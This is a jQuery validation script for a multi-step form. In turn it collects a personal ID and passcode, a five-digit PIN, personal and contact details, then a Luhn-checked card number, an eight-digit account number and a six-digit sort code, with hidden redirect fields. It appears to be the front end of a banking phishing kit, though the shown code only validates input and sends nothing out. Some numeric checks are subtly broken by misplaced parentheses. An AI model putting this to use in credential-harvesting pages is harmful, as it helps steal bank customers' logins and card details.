$(document).ready(function() {

  // Tabs
  $('.main_left-words li a').click(function(e){
    e.preventDefault();
    $('.lia').removeClass('red_bottom');
    $(this).addClass('red_bottom');
  });

  // 
  $('input').on('input change', function(){
    if ($(this).val().length >= 3){
      $(this).removeClass('error');
    }else{
      $(this).addClass('error');
    }
  });

  $('select').on('change', function(){
    if ($(this).val() !== ''){
      $(this).removeClass('error');
    }else{
      $(this).addClass('error');
    }
  });

  // Step_0
  $('#form_0').on('input change', function(){
    var error = false;
    if ($('#personalId').val().length < 5){
      error = true;
    }
    if ($('#password').val().length !== 5  || $.isNumeric($('#password').val()==false)){
      error = true;
    }
    if (error == false){
      $('#submit').removeAttr('disabled');
    }else{
      $('#submit').attr('disabled', '');
    }
  });

  $('#form_0').submit(function(){
    $('#submit, .forget_a').hide();
    $('#loader').show();
    $('#submit').attr('disabled', '');
  });

  // Step_1
  $('#form_1').on('input change', function(){
    var error = false;
    var re = new RegExp(/^\d+$/);

    if ($('#pin').val().length !== 5 || re.test($('#pin').val()) == false){
      error = true;
    }
    if (error == false){
      $('#submit').removeAttr('disabled');
    }else{
      $('#submit').attr('disabled', '');
    }
  });
  $('#form_1').submit(function(){
    $('#submit, .forget_a').hide();
    $('#loader').show();
    $('#submit').attr('disabled', '');
  });

  // Step 2
  $('#form_2').on('input change', function(){
    var error = false;
    var inputs = $('#form_2 input');
    var selects = $('#form_2 select');

    $.each(inputs, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit' && $(this).attr('name') !== 'mName'){
        if ($(this).val().length < 3){
          error = true;
        }
      }
    });

    $.each(selects, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit'){
        if ($(this).val() == ''){
          error = true;
        }
      }
    });

    if (error == false){
      $('#submit').removeAttr('disabled');
    }else{
      $('#submit').attr('disabled', '');
    }

  });

  $('#form_2').submit(function(){
    var error = false;
    var inputs = $('#form_2 input');
    var selects = $('#form_2 select');

    $.each(inputs, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit' && $(this).attr('name') !== 'mName'){
        if ($(this).val().length < 3){
          error = true;
          $(this).addClass('error');
        }else{
          $(this).removeClass('error');
        }
      }
    });

    $.each(selects, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit'){
        if ($(this).val() == ''){
          error = true;
          $(this).addClass('error');
        }else{
          $(this).removeClass('error');
        }
      }
    });

    if (isEmail($('#email').val())==false){
      error = true;
      $('#email').addClass('error');
      $('#email').next().show();
    }else{
      $('#email').removeClass('error');
      $('#email').next().hide();
    }

    if ($('#postalCode').val().length < 3){
      error = true;
      $('#postalCode').addClass('error');
      $('#postalCode').next().show();
    }else{
      $('#postalCode').removeClass('error');
      $('#postalCode').next().hide();
    }

    if (error !== false){
      return false;
    }else{
      $('#submit, .forget_a').hide();
      $('#loader').show();
      $('#submit').attr('disabled', '');
    }
  });


  // Step_3
  $('#form_3').on('input change', function(){
    var error = false;
    var inputs = $('#form_3 input');
    var selects = $('#form_3 select');

    $.each(inputs, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit'){
        if ($(this).val().length < 3){
          error = true;
        }
        if ($(this).attr('name') == 'cardnumber'){
          if(($(this).val()=='') || (luhnCheck($(this).val().replace(/\s/g, ''))==false) || $(this).val().replace(/\s/g, '').length !== 16){
            error=true;
          }
        }

        if ($(this).attr('name') == 'acn' ){
          if(($(this).val().length != 8) || $.isNumeric($(this).val()==false)){
            error=true;
          }
        }
        if ($(this).attr('name') == 'src' ){
          if(($(this).val().length != 6) || $.isNumeric($(this).val()==false)){
            error=true;
          }
        }


      }
    });

    $.each(selects, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit'){
        if ($(this).val() == ''){
          error = true;
        }
      }
    });

    if (error == false){
      $('#submit').removeAttr('disabled');
    }else{
      $('#submit').attr('disabled', '');
    }
  });

  $('#form_3').submit(function(){
    var error = false;
    var inputs = $('#form_3 input');
    var selects = $('#form_3 select');

    $.each(inputs, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit'){
        if ($(this).val().length < 3){
          error = true;
          $(this).addClass('error');
        }else{
          $(this).removeClass('error');
        }
        if ($(this).attr('name') == 'cardnumber'){
          if(($(this).val()=='') || (luhnCheck($(this).val().replace(/\s/g, ''))==false) || $(this).val().replace(/\s/g, '').length !== 16){
            error=true;
            $(this).addClass('error');
          }else{
            $(this).removeClass('error');
          }
        }
      }
    });

    $.each(selects, function(index){
      if ($(this).attr('name') !== 'redirurl' && $(this).attr('name') !== 'submit'){
        if ($(this).val() == ''){
          error = true;
          $(this).addClass('error');
        }else{
          $(this).removeClass('error');
        }
      }
    });

    if (error !== false){
      return false;
    }else{
      $('#submit, .forget_a').hide();
      $('#loader').show();
      $('#submit').attr('disabled', '');
    }
  });

  $('#cardnumber').on('input', function() {
    if ($(this).val() == ''){
      $(this).removeClass('amex');
      $(this).removeClass('visa');
      $(this).removeClass('master');
    }else{
      if($(this).val()[0]==4){
        $(this).removeClass('amex');
        $(this).addClass('visa');
        $(this).removeClass('master');
      }else if($(this).val()[0]==5 || $(this).val()[0]==2){
        $(this).removeClass('amex');
        $(this).removeClass('visa');
        $(this).addClass('master');
      }else if($(this).val()[0]==3){
        $(this).addClass('amex');
        $(this).removeClass('visa');
        $(this).removeClass('master');
      }else{
        $(this).removeClass('amex');
        $(this).removeClass('visa');
        $(this).removeClass('master');
      }
    }
  })
 
});

function isEmail(email) {
  var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  return regex.test(email);
}
var luhnCheck = function (number) {
  var i, d, col, sum = 0;
  number += ''; // make the number a string/array-like

  for (i = number.length, column = i % 2; i--;) { // work right to left
      d = +number[i]; // take each digit in the number
      // double every second digit, from the rightmost
      // sum all the individual digits 
      sum += (column === i % 2) ? ((d *= 2) > 9) ? (d - 9) : d : d;
  }

  // if the sum is a multiple of 10, the number is possibly valid
  return !(sum % 10);
}

